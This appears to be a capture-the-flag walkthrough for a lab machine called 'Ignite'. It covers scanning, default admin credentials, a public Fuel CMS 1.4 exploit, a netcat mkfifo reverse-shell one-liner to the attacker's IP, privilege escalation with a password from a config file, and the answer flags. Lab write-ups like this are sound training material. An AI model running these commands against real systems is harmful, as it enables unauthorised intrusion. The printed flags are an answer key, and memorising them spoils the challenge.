# Ignite

## Summary

1. `nmap -A -T5 -sV --script vuln <IP>` -> only port 80
2. Go to `<IP>` in browser and get default admin user and password (`admin` and `admin`)
3. In the main page, we see `Fuel CMS 1.4`. Search that up in [exploit-db](https://www.exploit-db.com/exploits/47138)
4. Copy the python script and change the hosts
5. Use the script to connect to the machine and open the shell
6. Traverse the dirs manually and `cat /home/www-data/flag.txt` to get the first flag
7. In Kali machine, open netcat listener `nc -lvnp <Custom Port>`
8. In the remote python shell, `rm /tmp/f; mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2>&1 | nc <Kali IP> <Custom Port> >/tmp/f`
9. In the remote python shell, `python -c 'import pty; pty.spawn("/bin/sh")'`
10. `su` with password `mememe` (found in the file `fuel/application/config/database.php` according to the website)
11. `cat /root/root.txt` to get the second flag

## Solutions

1. Root it!

   1. `6470e394cbf6dab6a91682cc8585059b`
   2. `b9bbcb33e11b80be759c4e844862482d`
